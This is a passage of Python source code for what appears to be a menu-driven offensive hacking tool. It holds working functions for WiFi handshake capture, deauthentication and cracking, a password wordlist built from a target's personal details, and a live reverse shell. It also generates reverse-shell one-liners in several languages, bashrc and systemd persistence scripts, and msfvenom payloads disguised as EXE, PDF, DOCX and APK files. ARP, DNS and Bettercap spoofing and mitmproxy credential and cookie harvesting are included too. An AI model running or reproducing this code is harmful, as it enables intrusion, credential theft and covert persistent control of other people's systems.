                found.append(subdomain)
            except:
                pass
            if i % 500 == 0:
                print(f"  ...{i} subdomains tested...")
    if found:
        print(f"[+] {len(found)} subdomains found.")
        log_result("subdomains", "\n".join(found))
    else:
        print("[!] No subdomains found.")

# Directory Bruteforce (basic, using wordlist)
def dir_bruteforce(base):
    wordlist = input("Dir wordlist path (default /usr/share/wordlists/dirb/common.txt): ").strip() or "/usr/share/wordlists/dirb/common.txt"
    if not os.path.exists(wordlist):
        print("[-] Dirb wordlist not found!")
        return
    print(f"[+] Bruteforcing directories on {base}")
    found = []
    with open(wordlist) as f:
        for i, line in enumerate(f, 1):
            path = line.strip()
            url = f"{base}/{path}"
            try:
                r = requests.get(url)
                if r.status_code == 200:
                    print(f"[FOUND] {url} [200]")
                    found.append(url)
                else:
                    print(f"[X] {url} [{r.status_code}]")
            except:
                pass
            if i % 100 == 0:
                print(f"  ...{i} paths tested...")
    if found:
        print(f"[+] {len(found)} directories found.")
        log_result("dirbrute", "\n".join(found))
    else:
        print("[!] No directories found.")

# CVE Search (using cve.circl.lu API)
def cve_lookup(keyword):
    try:
        url = f"https://cve.circl.lu/api/search/{keyword}"
        r = requests.get(url)
        data = r.json()
        results = data.get("data", [])
        if not results:
            print("[-] No CVEs found.")
            return
        for item in results[:5]:
            print(f"CVE: {item.get('id')} - {item.get('summary')}")
            print(f"  CVSS: {item.get('cvss')}")
            print(f"  Published: {item.get('Published')}")
            print(f"  References: {item.get('references')[:2]}")
        log_result("cve", json.dumps(results[:5]))
    except Exception as e:
        print(f"[-] Error: {e}")

# Gobuster Dir Scan (wrapper)
def gobuster_scan(target_url):
    ensure_installed("gobuster", "gobuster")
    wordlist = input("Gobuster wordlist path (default /usr/share/wordlists/dirb/common.txt): ").strip() or "/usr/share/wordlists/dirb/common.txt"
    print(f"[+] Running gobuster on {target_url}")
    result = subprocess.run(["gobuster", "dir", "-u", target_url, "-w", wordlist], capture_output=True, text=True)
    found = []
    for line in result.stdout.splitlines():
        if line.startswith("/") and "Status:" in line:
            print(line)
            found.append(line)
    if found:
        print(f"[+] {len(found)} directories found.")
        log_result("gobuster", "\n".join(found))
    else:
        print("[!] No directories found by gobuster.")

def osint_wordlist_generator():
    print("[+] OSINT Wordlist Generator")
    name = input("Target's full name: ").strip()
    nickname = input("Nickname/alias (optional): ").strip()
    company = input("Company/organization (optional): ").strip()
    birth_year = input("Birth year (optional): ").strip()
    keywords = input("Other keywords (comma separated): ").strip().split(",")
    
    # Ask for number of password generations
    while True:
        try:
            num_generations = input("Number of password variations to generate (default 100): ").strip()
            if not num_generations:
                num_generations = 100
            else:
                num_generations = int(num_generations)
                if num_generations <= 0:
                    print("[-] Number must be positive. Using default 100.")
                    num_generations = 100
            break
        except ValueError:
            print("[-] Invalid number. Using default 100.")
            num_generations = 100
    
    base = []
    if name:
        parts = name.split()
        base.extend(parts)
        base.append(name.replace(" ", ""))
    if nickname:
        base.append(nickname)
    if company:
        base.append(company)
    if birth_year:
        base.append(birth_year)
    base.extend([k.strip() for k in keywords if k.strip()])
    
    if not base:
        print("[-] No base words provided. Please enter at least one piece of information.")
        return
    
    # Generate variations with controlled count
    wordlist = set()
    suffixes = ["123", "!", "2023", "2024", "#", "@", "1", "01", "2", "3", "4", "5", "6", "7", "8", "9", "0"]
    years = ["2020", "2021", "2022", "2023", "2024", "2025"]
    special_chars = ["!", "@", "#", "$", "%", "^", "&", "*", "(", ")", "_", "+", "-", "="]
    
    # Add base words first
    for word in base:
        if len(wordlist) >= num_generations:
            break
        wordlist.add(word)
        wordlist.add(word.lower())
        wordlist.add(word.upper())
        wordlist.add(word.capitalize())
    
    # Add variations with suffixes
    for word in base:
        if len(wordlist) >= num_generations:
            break
        for suffix in suffixes:
            if len(wordlist) >= num_generations:
                break
            wordlist.add(word + suffix)
            wordlist.add(word.lower() + suffix)
            wordlist.add(word.upper() + suffix)
    
    # Add year combinations
    for word in base:
        if len(wordlist) >= num_generations:
            break
        for year in years:
            if len(wordlist) >= num_generations:
                break
            wordlist.add(word + year)
            wordlist.add(word.lower() + year)
    
    # Add special character combinations
    for word in base:
        if len(wordlist) >= num_generations:
            break
        for char in special_chars:
            if len(wordlist) >= num_generations:
                break
            wordlist.add(word + char)
            wordlist.add(char + word)
            wordlist.add(word.lower() + char)
    
    # Add number combinations (1-999)
    for word in base:
        if len(wordlist) >= num_generations:
            break
        for i in range(1, min(100, num_generations - len(wordlist) + 1)):
            if len(wordlist) >= num_generations:
                break
            wordlist.add(word + str(i))
            wordlist.add(word.lower() + str(i))
            wordlist.add(str(i) + word)
    
    # Add leetspeak variations
    leet_dict = {'a': '4', 'e': '3', 'i': '1', 'o': '0', 's': '5', 't': '7'}
    for word in base:
        if len(wordlist) >= num_generations:
            break
        leet_word = word.lower()
        for char, replacement in leet_dict.items():
            leet_word = leet_word.replace(char, replacement)
        wordlist.add(leet_word)
    
    # Add reversed words
    for word in base:
        if len(wordlist) >= num_generations:
            break
        wordlist.add(word[::-1])
        wordlist.add(word.lower()[::-1])
    
    # Add combinations of base words
    if len(base) > 1:
        for i, word1 in enumerate(base):
            if len(wordlist) >= num_generations:
                break
            for word2 in base[i+1:]:
                if len(wordlist) >= num_generations:
                    break
                wordlist.add(word1 + word2)
                wordlist.add(word1.lower() + word2.lower())
                wordlist.add(word1 + word2.lower())
    
    # Convert to list and limit to exact number requested
    wordlist = list(wordlist)[:num_generations]
    
    # Save to file
    fname = input("Save wordlist as (default osint_wordlist.txt): ").strip() or "osint_wordlist.txt"
    with open(fname, "w") as f:
        for w in sorted(wordlist):
            f.write(w + "\n")
    
    print(f"[+] Wordlist saved to {fname} ({len(wordlist)} entries)")
    print(f"[+] Generated exactly {len(wordlist)} password variations as requested")
    
    # Show sample of generated passwords
    if wordlist:
        print(f"[+] Sample passwords: {', '.join(wordlist[:5])}")
        if len(wordlist) > 5:
            print(f"[+] ... and {len(wordlist) - 5} more variations")

def wifi_scan():
    print("[+] Scanning for WiFi networks (requires monitor mode and root)...")
    iface = input("Wireless interface (e.g. wlan0): ").strip()
    print("[*] Enabling monitor mode...")
    subprocess.run(["sudo", "airmon-ng", "start", iface])
    mon_iface = iface + "mon" if not iface.endswith("mon") else iface
    print(f"[*] Using monitor interface: {mon_iface}")
    print("[*] Press Ctrl+C to stop scanning.")
    try:
        subprocess.run(["sudo", "airodump-ng", mon_iface])
    except KeyboardInterrupt:
        print("[!] Scan stopped.")
    subprocess.run(["sudo", "airmon-ng", "stop", mon_iface])

def wifi_handshake_capture():
    print("[+] Capture WPA handshake (requires monitor mode and root)...")
    if not check_root():
        print("[-] Root privileges required.")
        return
    
    # Get interface
    iface = input("Wireless interface (e.g. wlan0): ").strip()
    if not iface:
        print("[-] Interface name required.")
        return
    
    # Check if aircrack-ng tools are available
    if shutil.which("airodump-ng") is None:
        print("[-] airodump-ng not found. Please install aircrack-ng suite.")
        return
    
    # Get target details
    bssid = input("Target BSSID (AP MAC): ").strip()
    if not bssid or len(bssid.split(':')) != 6:
        print("[-] Invalid BSSID format. Use format: AA:BB:CC:DD:EE:FF")
        return
    
    channel = input("Channel: ").strip()
    try:
        channel = int(channel)
        if channel < 1 or channel > 14:
            print("[-] Invalid channel. Use 1-14 for 2.4GHz.")
            return
    except ValueError:
        print("[-] Invalid channel number.")
        return
    
    out_file = input("Output file prefix (default: handshake): ").strip() or "handshake"
    
    # Handle monitor mode
    mon_iface = iface
    if not iface.endswith("mon"):
        print("[*] Enabling monitor mode...")
        try:
            # Try different monitor mode naming conventions
            result = subprocess.run(["sudo", "airmon-ng", "start", iface], capture_output=True, text=True)
            if result.returncode == 0:
                # Check what interface name was created
                if f"{iface}mon" in result.stdout:
                    mon_iface = f"{iface}mon"
                elif f"{iface}_mon" in result.stdout:
                    mon_iface = f"{iface}_mon"
                else:
                    # Try to find the monitor interface
                    iw_output = subprocess.getoutput("iwconfig")
                    for line in iw_output.split('\n'):
                        if iface in line and "Mode:Monitor" in line:
                            mon_iface = line.split()[0]
                            break
                    if mon_iface == iface:
                        print(f"[!] Could not determine monitor interface name. Using {iface}")
            else:
                print(f"[-] Failed to enable monitor mode: {result.stderr}")
                return
        except Exception as e:
            print(f"[-] Error enabling monitor mode: {e}")
            return
    
    print(f"[*] Using monitor interface: {mon_iface}")
    
    # Ask if user wants to deauth clients
    deauth = input("Send deauth packets to force handshake? (y/N): ").strip().lower() == 'y'
    
    if deauth:
        print("[*] Starting deauth attack in background...")
        try:
            deauth_proc = subprocess.Popen(["sudo", "aireplay-ng", "--deauth", "0", "-a", bssid, mon_iface])
        except Exception as e:
            print(f"[-] Failed to start deauth: {e}")
            deauth_proc = None
    
    print("[*] Starting handshake capture. Press Ctrl+C when done.")
    print("[*] Look for 'WPA handshake' message in the output.")
    
    try:
        # Run airodump-ng without capturing stdout to see live output
        proc = subprocess.Popen(["sudo", "airodump-ng", "-c", str(channel), "--bssid", bssid, "-w", out_file, mon_iface])
        proc.wait()
    except KeyboardInterrupt:
        print("[!] Capture stopped.")
        if 'deauth_proc' in locals() and deauth_proc:
            deauth_proc.terminate()
    except Exception as e:
        print(f"[-] airodump-ng failed: {e}")
        if 'deauth_proc' in locals() and deauth_proc:
            deauth_proc.terminate()
    
    # Stop monitor mode
    try:
        subprocess.run(["sudo", "airmon-ng", "stop", mon_iface])
    except Exception as e:
        print(f"[!] Warning: Could not stop monitor mode: {e}")
    
    # Check for capture files
    cap_files = []
    for i in range(1, 10):  # Check for multiple files
        test_file = f"{out_file}-{i:02d}.cap"
        if os.path.exists(test_file) and os.path.getsize(test_file) > 0:
            cap_files.append(test_file)
    
    if cap_files:
        print(f"[+] Found capture files: {', '.join(cap_files)}")
        
        # Check for handshake in each file
        handshake_found = False
        for cap_file in cap_files:
            print(f"[*] Checking {cap_file} for handshake...")
            try:
                result = subprocess.run(["aircrack-ng", "-a2", "-w", "/dev/null", cap_file], 
                                      capture_output=True, text=True, timeout=30)
                if "1 handshake" in result.stdout or "handshake(s)" in result.stdout:
                    print(f"[+] Handshake(s) detected in {cap_file}!")
                    handshake_found = True
                    break
                else:
                    print(f"[-] No handshake in {cap_file}")
            except subprocess.TimeoutExpired:
                print(f"[-] Timeout checking {cap_file}")
            except Exception as e:
                print(f"[-] Error checking {cap_file}: {e}")
        
        if not handshake_found:
            print("[!] No handshake found. Try:")
            print("  1. Wait for a client to connect")
            print("  2. Use deauth attack to force reconnection")
            print("  3. Check if the AP is actually WPA/WPA2")
    else:
        print(f"[-] No capture files found. Check if {out_file}-*.cap exists.")
    
    input("\n[Press Enter to return to the menu]")

def wifi_crack_handshake():
    print("[+] Crack WPA/WPA2 handshake with aircrack-ng or hashcat...")
    if shutil.which("aircrack-ng") is None:
        print("[-] aircrack-ng not found. Please install aircrack-ng.")
        return
    cap_file = input("Handshake .cap file: ").strip()
    if not os.path.exists(cap_file):
        print(f"[-] File {cap_file} not found.")
        return
    wordlist = input("Wordlist path (default /usr/share/wordlists/rockyou.txt): ").strip() or "/usr/share/wordlists/rockyou.txt"
    if not os.path.exists(wordlist):
        print(f"[-] Wordlist {wordlist} not found.")
        return
    print("[*] Cracking with aircrack-ng...")
    save = input("Save results to file? (y/N): ").strip().lower() == 'y'
    if save:
        out_file = input("Output file (default: aircrack_result.txt): ").strip() or "aircrack_result.txt"
        with open(out_file, "w") as f:
            try:
                proc = subprocess.Popen(["aircrack-ng", "-w", wordlist, cap_file], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
                if proc.stdout is not None:
                    for line in proc.stdout:
                        print(line, end='')
                        f.write(line)
                proc.wait()
                print(f"[+] Results saved to {out_file}")
            except Exception as e:
                print(f"[-] aircrack-ng failed: {e}")
    else:
        try:
            proc = subprocess.Popen(["aircrack-ng", "-w", wordlist, cap_file])
            proc.communicate()
        except Exception as e:
            print(f"[-] aircrack-ng failed: {e}")
    # Optionally, add hashcat support here
    input("\n[Press Enter to return to the menu]")

def wifi_deauth_attack():
    print("[+] Deauthentication attack (requires monitor mode and root)...")
    iface = input("Wireless interface (e.g. wlan0): ").strip()
    bssid = input("Target BSSID (AP MAC): ").strip()
    client = input("Target client MAC (leave blank for broadcast): ").strip()
    print("[*] Enabling monitor mode...")
    subprocess.run(["sudo", "airmon-ng", "start", iface])
    mon_iface = iface + "mon" if not iface.endswith("mon") else iface
    print(f"[*] Using monitor interface: {mon_iface}")
    if client:
        print(f"[*] Sending deauth packets to {client} on {bssid}")
        subprocess.run(["sudo", "aireplay-ng", "--deauth", "10", "-a", bssid, "-c", client, mon_iface])
    else:
        print(f"[*] Sending broadcast deauth packets on {bssid}")
        subprocess.run(["sudo", "aireplay-ng", "--deauth", "10", "-a", bssid, mon_iface])
    subprocess.run(["sudo", "airmon-ng", "stop", mon_iface])

def wifi_wifite():
    print("[+] Launching Wifite (automated WiFi attack tool)...")
    subprocess.run(["sudo", "wifite"])

def reverse_shell():
    print("[!] WARNING: Use the reverse shell only for authorized, ethical testing.")
    ip = input("Connect back to IP: ").strip()
    port = input("Port: ").strip()
    try:
        port = int(port)
    except ValueError:
        print("[-] Invalid port number.")
        return
    print(f"[+] Launching reverse shell to {ip}:{port} ...")
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((ip, port))
        os.dup2(s.fileno(), 0)
        os.dup2(s.fileno(), 1)
        os.dup2(s.fileno(), 2)
        import pty
        pty.spawn("/bin/bash")
    except Exception as e:
        print(f"[-] Reverse shell failed: {e}")

def generate_reverse_shell_payload():
    print("[!] Generate reverse shell payload for use on a target.")
    ip = input("Attacker IP (your IP): ").strip()
    port = input("Port to connect back to: ").strip()
    try:
        port = int(port)
    except ValueError:
        print("[-] Invalid port number.")
        return
    print("Select payload type:")
    print("1. Python (default)")
    print("2. Bash")
    print("3. Netcat")
    print("4. Perl")
    print("5. PHP")
    print("6. PowerShell (Windows)")
    print("7. Android Bash (rooted/busybox)")
    ptype = input("Payload type [1-7]: ").strip() or "1"
    if ptype == "2":
        payload = f"bash -i >& /dev/tcp/{ip}/{port} 0>&1"
    elif ptype == "3":
        payload = f"nc -e /bin/bash {ip} {port}"
    elif ptype == "4":
        payload = f"perl -e 'use Socket;$i=\"{ip}\";$p={port};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/bash -i\");}};'"
    elif ptype == "5":
        payload = f"php -r '$sock=fsockopen(\"{ip}\",{port});exec(\"/bin/bash -i <&3 >&3 2>&3\");'"
    elif ptype == "6":
        payload = f"powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient(\"{ip}\",{port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()"
    elif ptype == "7":
        payload = f"/system/bin/sh -i >& /dev/tcp/{ip}/{port} 0>&1"
    else:
        payload = f"python3 -c 'import socket,os,pty;s=socket.socket();s.connect((\"{ip}\",{port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\"/bin/bash\")'"
    print("\n[+] Copy and run this on the target:")
    print(payload)
    save = input("Save as script file? (y/N): ").strip().lower() == 'y'
    if save:
        fname = input("Filename (default: revshell.txt): ").strip() or "revshell.txt"
        with open(fname, "w") as f:
            f.write(payload + "\n")
        print(f"[+] Script saved as {fname}")
    if ptype == "7":
        print("[!] This payload works on rooted Androids with busybox or netcat support.")
        print("[!] You may need to use /system/xbin/busybox sh or /system/xbin/nc depending on the device.")

def generate_persistence_script():
    print("[!] Generate a Linux persistence script for a reverse shell.")
    ip = input("Attacker IP (your IP): ").strip()
    port = input("Port to connect back to: ").strip()
    try:
        port = int(port)
    except ValueError:
        print("[-] Invalid port number.")
        return
    print("Select persistence method:")
    print("1. Add to ~/.bashrc (default)")
    print("2. Add to ~/.profile")
    print("3. Create systemd service (root)")
    method = input("Method [1-3]: ").strip() or "1"
    payload = f"bash -i >& /dev/tcp/{ip}/{port} 0>&1"
    if method == "2":
        script = f'echo "{payload}" >> ~/.profile'
    elif method == "3":
        script = f'''echo -e '[Unit]\nDescription=Reverse Shell\n[Service]\nType=simple\nExecStart=/bin/bash -c \"{payload}\"\n[Install]\nWantedBy=multi-user.target' | sudo tee /etc/systemd/system/revshell.service > /dev/null
sudo systemctl daemon-reload
sudo systemctl enable revshell.service
sudo systemctl start revshell.service'''
    else:
        script = f'echo "{payload}" >> ~/.bashrc'
    print("\n[+] Run this on the target for persistence:")
    print(script)
    save = input("Save as script file? (y/N): ").strip().lower() == 'y'
    if save:
        fname = input("Filename (default: persistence.sh): ").strip() or "persistence.sh"
        with open(fname, "w") as f:
            f.write(script + "\n")
        print(f"[+] Script saved as {fname}")

def start_listener():
    print("[!] Start a Netcat (nc) listener to catch reverse shells.")
    port = input("Port to listen on: ").strip()
    try:
        port = int(port)
    except ValueError:
        print("[-] Invalid port number.")
        return
    print(f"[+] To listen for a reverse shell, run this command in your terminal:")
    print(f"nc -lvnp {port}")
    # Optionally, try to launch nc automatically if available
    if shutil.which("nc"):
        auto = input("Launch listener now? (y/N): ").strip().lower() == 'y'
        if auto:
            print(f"[+] Starting listener on port {port} (press Ctrl+C to stop)...")
            try:
                subprocess.run(["nc", "-lvnp", str(port)])
            except KeyboardInterrupt:
                print("[!] Listener stopped.")

def generate_msfvenom_payload():
    print("[!] Automated msfvenom payload generator (requires Metasploit installed)")
    print("Select payload type:")
    print("1. Windows EXE (.exe)")
    print("2. PDF (.pdf, requires vulnerable reader)")
    print("3. Word DOCX (.docx, macro, requires user to enable macros)")
    print("4. Android APK (.apk)")
    ptype = input("Payload type [1-4]: ").strip()
    lhost = input("LHOST (your IP): ").strip()
    lport = input("LPORT (your port): ").strip()
    output = input("Output filename (e.g. shell.exe): ").strip()
    if not lhost or not lport or not output:
        print("[-] LHOST, LPORT, and output filename are required.")
        return
    if ptype == "1":
        payload = "windows/shell_reverse_tcp"
        fmt = "exe"
    elif ptype == "2":
        payload = "windows/meterpreter/reverse_tcp"
        fmt = "pdf"
    elif ptype == "3":
        payload = "windows/meterpreter/reverse_tcp"
        fmt = "raw"
    elif ptype == "4":
        payload = "android/meterpreter/reverse_tcp"
        fmt = "apk"
    else:
        print("[-] Invalid payload type.")
        return
    print(f"[+] Generating payload with msfvenom...")
    if ptype == "3":
        macro_file = output if output.endswith(".txt") else output + ".txt"
        cmd = ["msfvenom", "-p", payload, f"LHOST={lhost}", f"LPORT={lport}", "-f", fmt, "-o", macro_file]
        print(f"[!] For DOCX, you must embed the macro from {macro_file} into a Word document manually.")
    else:
        cmd = ["msfvenom", "-p", payload, f"LHOST={lhost}", f"LPORT={lport}", "-f", fmt, "-o", output]
    spinner = Spinner("Generating payload")
    spinner.start()
    try:
        subprocess.run(cmd, check=True)
    except Exception as e:
        spinner.stop()
        print(f"[-] msfvenom failed: {e}")
        return
    spinner.stop()
    print(f"[+] Payload generated: {output if ptype != '3' else macro_file}")
    if ptype == "2":
        print("[!] PDF payloads require a vulnerable PDF reader to be effective.")
    if ptype == "3":
        print("[!] Embed the macro into a Word document and instruct the user to enable macros.")
    if ptype == "4":
        print("[!] APK payloads require installation and permissions on the target device.")
        print("[!] To catch the session, use Metasploit multi/handler:")
        print("    msfconsole")
        print("    use exploit/multi/handler")
        print("    set payload android/meterpreter/reverse_tcp")
        print(f"    set LHOST {lhost}")
        print(f"    set LPORT {lport}")
        print("    run")

def bettercap_menu():
    menu_text = """
[Bettercap MITM]
1. Start Bettercap CLI (WiFi/Ethernet) - Live Terminal
2. Start Bettercap Web UI (remote control)
3. Bettercap + msfvenom Payload Integration
4. Show Bettercap credential log
0. Back
"""
    while True:
        print_menu_no_clear(menu_text)
        choice = input("[Bettercap] Select Option > ").strip()
        if choice == "1":
            ensure_installed("bettercap", "bettercap")
            iface = input("Interface (e.g. wlan0mon or eth0): ").strip()
            if not iface:
                print("[-] Interface required.")
                continue
                
            # Enable IP forwarding for MITM
            print("[*] Enabling IP forwarding...")
            subprocess.run(["sudo", "sysctl", "-w", "net.ipv4.ip_forward=1"])
            
            channel = input("WiFi Channel (optional, press Enter to skip): ").strip()
            caplet = input("Bettercap caplet (e.g. wifi-ap, http-req-dump, net.sniff, press Enter for default): ").strip()
            
            print("[!] Bettercap will run in live terminal mode.")
            print("[!] To harvest credentials, use caplets like 'wifi-ap', 'http-req-dump', or 'net.sniff'.")
            print("[!] Press Ctrl+C to stop bettercap.")
            
            cmd = ["sudo", "bettercap", "-iface", iface]
            if channel:
                cmd += ["-eval", f"wifi.channel {channel}"]
            if caplet:
                cmd += ["-caplet", caplet]
            
            print(f"[+] Running: {' '.join(cmd)}")
            print("[*] Bettercap is starting... (this may take a moment)")
            
            try:
                # Run bettercap in live terminal mode
                proc = subprocess.Popen(cmd)
                proc.wait()
            except KeyboardInterrupt:
                print("[!] Bettercap stopped.")
                if 'proc' in locals():
                    proc.terminate()
            except Exception as e:
                print(f"[-] Bettercap failed: {e}")
                
        elif choice == "2":
            ensure_installed("bettercap", "bettercap")
            iface = input("Interface (e.g. wlan0mon or eth0): ").strip()
            if not iface:
                print("[-] Interface required.")
                continue
                
            print("[+] Launching Bettercap Web UI on http://127.0.0.1:8083 (default password: bettercap)")
            print("[!] In your browser, go to http://127.0.0.1:8083 and login.")
            print("[!] For remote access, forward port 8083 or use SSH tunneling.")
            try:
                subprocess.run(["sudo", "bettercap", "-iface", iface, "-caplet", "http-ui"])
            except Exception as e:
                print(f"[-] Bettercap Web UI failed: {e}")
                
        elif choice == "3":
            ensure_installed("bettercap", "bettercap")
            if shutil.which("msfvenom") is None:
                print("[-] msfvenom not found. Please install Metasploit Framework.")
                continue
                
            iface = input("Interface (e.g. wlan0mon or eth0): ").strip()
            if not iface:
                print("[-] Interface required.")
                continue
                
            print("[+] Bettercap + msfvenom Integration")
            print("[!] This will start bettercap for MITM and generate msfvenom payloads.")
            
            # Generate msfvenom payload
            print("\n[*] Generating msfvenom payload...")
            payload_type = input("Payload type (windows/meterpreter/reverse_tcp, linux/x86/shell_reverse_tcp, etc.): ").strip()
            if not payload_type:
                payload_type = "windows/meterpreter/reverse_tcp"
                
            lhost = input("Your IP (LHOST): ").strip()
            if not lhost:
                print("[-] LHOST required for msfvenom.")
                continue
                
            lport = input("Port (LPORT, default 4444): ").strip() or "4444"
            
            output_file = f"payload_{payload_type.replace('/', '_')}.exe"
            
            print(f"[*] Generating {payload_type} payload...")
            try:
                msf_cmd = ["msfvenom", "-p", payload_type, f"LHOST={lhost}", f"LPORT={lport}", "-f", "exe", "-o", output_file]
                print(f"[+] Running: {' '.join(msf_cmd)}")
                subprocess.run(msf_cmd)
                
                if os.path.exists(output_file):
                    print(f"[+] Payload saved as: {output_file}")
                    print(f"[+] Start listener with: msfconsole -r -")
                    print(f"[+] In msfconsole, run: use exploit/multi/handler")
                    print(f"[+] Set: set PAYLOAD {payload_type}")
                    print(f"[+] Set: set LHOST {lhost}")
                    print(f"[+] Set: set LPORT {lport}")
                    print(f"[+] Run: exploit")
                else:
                    print("[-] Payload generation failed.")
                    continue
                    
            except Exception as e:
                print(f"[-] msfvenom failed: {e}")
                continue
                
            # Start bettercap
            print("\n[*] Starting Bettercap for MITM...")
            print("[!] Use bettercap to redirect traffic or serve the payload.")
            
            # Enable IP forwarding
            subprocess.run(["sudo", "sysctl", "-w", "net.ipv4.ip_forward=1"])
            
            try:
                cmd = ["sudo", "bettercap", "-iface", iface, "-caplet", "http-req-dump"]
                print(f"[+] Running: {' '.join(cmd)}")
                proc = subprocess.Popen(cmd)
                proc.wait()
            except KeyboardInterrupt:
                print("[!] Bettercap stopped.")
                if 'proc' in locals():
                    proc.terminate()
            except Exception as e:
                print(f"[-] Bettercap failed: {e}")
                
        elif choice == "4":
            log_path = os.path.expanduser("~/.bettercap/logs/creds.log")
            if os.path.exists(log_path):
                print(f"[+] Showing credentials from {log_path}:")
                with open(log_path) as f:
                    print(f.read())
            else:
                print("[-] No Bettercap credential log found.")
        elif choice == "0":
            break
        else:
            print("Invalid option.")

def mitm_menu():
    menu_text = """
[Advanced MITM Attacks]
1. ARP Spoofing (arpspoof)
2. HTTP/HTTPS Sniffing & Credential Harvesting (mitmproxy)
3. DNS Spoofing (dnsspoof)
4. Ettercap (CLI)
5. Bettercap (Full MITM)
0. Back
"""
    while True:
        print_menu_no_clear(menu_text)
        choice = input("[MITM] Select Option > ").strip()
        if choice == "1":
            ensure_installed("arpspoof", "dsniff")
            arp_spoof()
        elif choice == "2":
            ensure_installed("mitmproxy", "mitmproxy")
            http_sniff_and_harvest()
        elif choice == "3":
            ensure_installed("dnsspoof", "dsniff")
            dns_spoof()
        elif choice == "4":
            ensure_installed("ettercap", "ettercap-text-only")
            print("[+] Launching Ettercap CLI. For GUI, run 'sudo ettercap -G' in a separate terminal.")
            try:
                subprocess.run(["sudo", "ettercap", "-T", "-q", "-i", input("Interface (e.g. eth0): ").strip()])
            except Exception as e:
                print(f"[-] Ettercap failed: {e}")
        elif choice == "5":
            bettercap_menu()
        elif choice == "0":
            break
        else:
            print("Invalid option.")

def log_mitm_result(data):
    with open("results_mitm.txt", "a") as f:
        f.write(f"[{time.strftime('%Y-%m-%d %H:%M:%S')}] {data}\n")

def http_sniff_and_harvest():
    ensure_installed("mitmproxy", "mitmproxy")
    iface = input("Network interface (e.g. eth0): ").strip()
    port = input("Proxy port (default 8080): ").strip() or "8080"
    print("[!] You may need to set up iptables to redirect traffic to the proxy port.")
    print("[!] mitmproxy will log HTTP POST data and cookies for credential/session harvesting.")
    print(f"[+] Starting mitmproxy on {iface}:{port} (press q to quit)...")
    print("[!] After stopping mitmproxy, credentials and session tokens will be parsed and saved to results_mitm.txt.")
    flows_file = "mitmproxy_flows.log"
    try:
        subprocess.run(["mitmproxy", "-i", iface, "-p", port, "-w", flows_file])
    except Exception as e:
        print(f"[-] mitmproxy failed: {e}")
        return
    # Try to parse mitmproxy flows for credentials and session tokens
    try:
        try:
            import mitmproxy.io
            from mitmproxy import http
        except ImportError:
            print("[-] mitmproxy Python module not installed. Skipping parsing. You can install it with: pip install mitmproxy")
            return
        found = []
        with open(flows_file, "rb") as logfile:
            freader = mitmproxy.io.FlowReader(logfile)
            for flow in freader.stream():
                if isinstance(flow, http.HTTPFlow):
                    # Credential harvesting: look for POST data
                    if flow.request.method == "POST":
                        post_data = flow.request.get_text()
                        if any(k in post_data.lower() for k in ["pass", "user", "login", "pwd", "email"]):
                            entry = f"[CRED] {flow.request.host}{flow.request.path} | {post_data}"
                            print(entry)
                            log_mitm_result(entry)
                            found.append(entry)
                    # Session hijacking: look for cookies
                    cookies = flow.request.cookies.fields
                    if cookies:
                        entry = f"[COOKIE] {flow.request.host}{flow.request.path} | {cookies}"
                        print(entry)
                        log_mitm_result(entry)
                        found.append(entry)
        if not found:
            print("[!] No credentials or session tokens found in flows.")
        else:
            print(f"[+] {len(found)} credentials/session tokens harvested. See results_mitm.txt.")
    except Exception as e:
        print(f"[-] Error parsing mitmproxy flows: {e}")

def arp_spoof():
    ensure_installed("arpspoof", "dsniff")
    if not check_root():
        print("[-] Root privileges required for ARP spoofing.")
        return
        
    iface = input("Network interface (e.g. eth0): ").strip()
    if not iface:
        print("[-] Interface required.")
        return
        
    target = input("Target IP (victim): ").strip()
    if not target:
        print("[-] Target IP required.")
        return
        
    gateway = input("Gateway IP (router): ").strip()
    if not gateway:
        print("[-] Gateway IP required.")
        return
    
    print("[*] Enabling IP forwarding for MITM...")
    subprocess.run(["sudo", "sysctl", "-w", "net.ipv4.ip_forward=1"])
    
    print(f"[+] Starting ARP spoofing attack...")
    print(f"[+] Target: {target} | Gateway: {gateway} | Interface: {iface}")
    print("[!] This will poison ARP tables. Press Ctrl+C to stop.")
    
    try:
        # Start arpspoof in live mode
        cmd = ["sudo", "arpspoof", "-i", iface, "-t", target, gateway]
        print(f"[+] Running: {' '.join(cmd)}")
        proc = subprocess.Popen(cmd)
        proc.wait()
    except KeyboardInterrupt:
        print("[!] ARP spoofing stopped.")
        if 'proc' in locals():
            proc.terminate()
    except Exception as e:
        print(f"[-] arpspoof failed: {e}")

def dns_spoof():
    ensure_installed("dnsspoof", "dsniff")
    if not check_root():
        print("[-] Root privileges required for DNS spoofing.")
        return
        
    iface = input("Network interface (e.g. eth0): ").strip()
    if not iface:
        print("[-] Interface required.")
        return
        
    # Create a default hosts file if none provided
    hosts_file = input("Hosts file (press Enter for default): ").strip()
    if not hosts_file:
        hosts_file = "/tmp/dnshosts"
        # Create a sample hosts file
        with open(hosts_file, "w") as f:
            f.write("192.168.1.100 google.com\n")
            f.write("192.168.1.100 facebook.com\n")
            f.write("192.168.1.100 twitter.com\n")
        print(f"[*] Created default hosts file: {hosts_file}")
        print("[*] Edit this file to customize DNS spoofing targets.")
    
    if not os.path.exists(hosts_file):
        print(f"[-] Hosts file {hosts_file} not found.")
        return
    
    print(f"[+] Starting DNS spoofing...")
    print(f"[+] Interface: {iface} | Hosts file: {hosts_file}")
    print("[!] This will intercept DNS queries. Press Ctrl+C to stop.")
    
    try:
        cmd = ["sudo", "dnsspoof", "-i", iface, "-f", hosts_file]
        print(f"[+] Running: {' '.join(cmd)}")
        proc = subprocess.Popen(cmd)
        proc.wait()
    except KeyboardInterrupt:
